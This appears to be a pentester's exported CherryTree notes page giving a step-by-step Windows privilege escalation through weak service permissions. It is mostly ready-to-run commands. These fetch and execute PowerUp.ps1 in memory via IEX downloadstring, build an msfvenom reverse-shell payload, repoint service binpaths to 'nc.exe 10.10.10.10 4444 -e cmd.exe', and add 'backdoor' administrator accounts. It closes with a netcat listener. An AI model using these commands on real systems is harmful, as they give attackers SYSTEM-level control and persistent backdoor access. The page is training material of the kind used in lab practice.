<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manual</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>manual</h1><br/><br /><br /><strong>1. Run winPEAS to check for service misconfigurations:</strong><br />   ◇ <span style="text-decoration:underline;">AccessChk</span>(old version for command line): <a href="https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip" target="_blank">https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip</a><br />    We can check for &#39;Everyone&#39; ,&#39;Authenticated Users&#39;, $env:username<br />    <div class="codebox"><div class="codebox">PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uwcqv&nbsp;&#39;Everyone&#39;&nbsp;*&quot;;Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uwcqv&nbsp;&#39;Authenticated&nbsp;Users&#39;&nbsp;*&quot;;Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uwcqv&nbsp;$env:username&nbsp;*&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;</div></div><br />        <a href=""><img src="images/1320-1.png" alt="images/1320-1.png" /></a><br />        We have to check for service with:<br />         1&gt;  SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS<br />         2&gt;  SERVICE_STOP and SERVICE_START          <br />   ◇ <span style="text-decoration:underline;">PowerUp.ps1</span>: with method Get-ModifiableService<br />        Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if the current user has rights to change the service configuration.<br />        <div class="codebox"><div class="codebox">PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Get-ModifiableService</div></div><br />        <a href=""><img src="images/1320-2.png" alt="images/1320-2.png" /></a><br />   ◇ WinPeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><div class="codebox">PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;servicesinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;</div></div>  <br />        <a href=""><img src="images/1320-3.png" alt="images/1320-3.png" /></a><br /><br />2. OPTIONAL: check permission of the vulnerable service in the <a href="indows_Privilege_Escalation--2._Service_Exploits--Insecure_Service_Permissions_(weak_folder_permissions)--manual--permission_of_a_service.html">subchapter permission of a service</a>    <br /><br /><strong>3. Confirm what we have found:</strong><br />     ◇ <span style="text-decoration:underline;">AccessChk</span>(old version for command line):<br />    In the <span style="color:#a5452a;">example</span> below we check daclsvc, the vulnerable service found before<br />    <div class="codebox"><div class="codebox">PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uwcqv&nbsp;$env:username&nbsp;daclsvc&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;</div></div><br />    <a href=""><img src="images/1320-4.png" alt="images/1320-4.png" /></a><br />    <br /><strong>4. Check the current configuration of the service</strong><br />    It need to run with the <span style="color:#00ff00;">SYSTEM</span> user permissions, to take advantage from it<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;qc&nbsp;<span style="color:#000000;font-weight:400">[</span>service<span style="color:#000000;font-weight:400">]</span></div></div><br />    <a href=""><img src="images/1320-5.png" alt="images/1320-5.png" /></a><br /><br /><strong>5. Check the current status of the service</strong><br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;query&nbsp;<span style="color:#000000;font-weight:400">[</span>service<span style="color:#000000;font-weight:400">]</span></div></div><br />    <a href=""><img src="images/1320-6.png" alt="images/1320-6.png" /></a><br />    <br />6<strong>. Reconfigure the service, following we have these alternatives:<br />   </strong>◇ to use our reverse shell executable:<br />       <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;config&nbsp;daclsvc&nbsp;binpath=&nbsp;&quot;\&quot;C:\PrivEsc\reverse.exe\&quot;&quot;</div></div><br />       <a href=""><img src="images/1320-7.png" alt="images/1320-7.png" /></a><br />       reverse.exe is a payload created with msfvenom<br />       <div class="codebox"><div class="codebox">root@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;windows/x64/shell_reverse_tcp&nbsp;LHOST=192.168.147.139&nbsp;LPORT=53&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;reverse.exe</div></div><br />       <a href=""><img src="images/1320-8.png" alt="images/1320-8.png" /></a>       <br />   ◇ substitute with malicious executable<br />      <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;config&nbsp;[service&nbsp;name]&nbsp;binpath=&nbsp;&quot;malicious&nbsp;executable&nbsp;path&quot;&nbsp;#example:&nbsp;&quot;cmd&nbsp;\c&nbsp;C:\Users\nc.exe&nbsp;10.10.10.10&nbsp;4444&nbsp;-e&nbsp;cmd.exe&quot;</div></div><br />   ◇ sc: add an Administrator account<br />      <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;config&nbsp;[service&nbsp;name]&nbsp;binpath=&nbsp;&quot;net&nbsp;user&nbsp;admin&nbsp;password&nbsp;/add&quot;<br />C:\&gt;&nbsp;sc&nbsp;stop&nbsp;[service&nbsp;name]<br />C:\&gt;&nbsp;sc&nbsp;start&nbsp;[service&nbsp;name]<br />C:\&gt;&nbsp;sc&nbsp;config&nbsp;[service&nbsp;name]&nbsp;binpath=&nbsp;&quot;net&nbsp;localgroup&nbsp;Administrators&nbsp;admin&nbsp;/add&quot;&nbsp;&nbsp;&nbsp;&nbsp;#add&nbsp;user&nbsp;Admin&nbsp;to&nbsp;Administrators<br />C:\&gt;&nbsp;sc&nbsp;stop&nbsp;[service&nbsp;name]<br />C:\&gt;&nbsp;sc&nbsp;start&nbsp;<span style="color:#000000;font-weight:400">[</span>service&nbsp;name<span style="color:#000000;font-weight:400">]</span></div></div><br />   ◇ powerup.ps1: add Administrator account <br />      <div class="codebox"><div class="codebox">PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Install-ServiceBinary&nbsp;-Name&nbsp;&#39;daclsvc&#39;&nbsp;-Command&nbsp;“net&nbsp;user&nbsp;backdoor&nbsp;Password123!&nbsp;/add&nbsp;&amp;&amp;&nbsp;timeout&nbsp;/t&nbsp;5&nbsp;&amp;&amp;&nbsp;net&nbsp;localgroup&nbsp;Administrators&nbsp;backdoor&nbsp;/add”</div></div><br />        <a href=""><img src="images/1320-9.png" alt="images/1320-9.png" /></a><br />        <a href=""><img src="images/1320-10.png" alt="images/1320-10.png" /></a><br />       <a href=""><img src="images/1320-11.png" alt="images/1320-11.png" /></a><br /><br /><strong>6. Start a listener on Kali, and then start the service to trigger the exploit</strong>:<br />   1) Listener on kali<br />       <div class="codebox"><div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div></div><br />   2) Start the service<br />      ▪ net<br />          <div class="codebox"><div class="codebox">C:\&gt;&nbsp;net&nbsp;start&nbsp;daclsvc</div></div><br />      ▪ sc<br />          <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;start&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>serviceName<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />      ▪ Start-Service powershell cmdlet<br />          <div class="codebox"><div class="codebox">PS&gt;&nbsp;start-service&nbsp;-name&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>serviceName<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />   3) if we have used:<br />      ◇ a reverse shell<br />           <a href=""><img src="images/1320-12.png" alt="images/1320-12.png" /></a><br />      ◇ an administrator account:<br />        <div class="codebox"><div class="codebox">PS&gt;&nbsp;net&nbsp;user<br />PS&gt;&nbsp;net&nbsp;localgroup&nbsp;Administrators</div></div><br />        <a href=""><img src="images/1320-13.png" alt="images/1320-13.png" /></a><br />           <br /><br /><br /><br /><br />Bibliography<br />• <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#modify-service-binary-path" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#modify-service-binary-path</a><br />• <a href="https://pentestlab.blog/2017/03/30/weak-service-permissions/" target="_blank">https://pentestlab.blog/2017/03/30/weak-service-permissions/</a><br />• <a href="https://sec-consult.com/blog/detail/what-unites-hp-philips-and-fujitsu-one-service-and-millions-of-vulnerable-devices/" target="_blank">https://sec-consult.com/blog/detail/what-unites-hp-philips-and-fujitsu-one-service-and-millions-of-vulnerable-devices/</a><br /> </div>
</body>
</html>
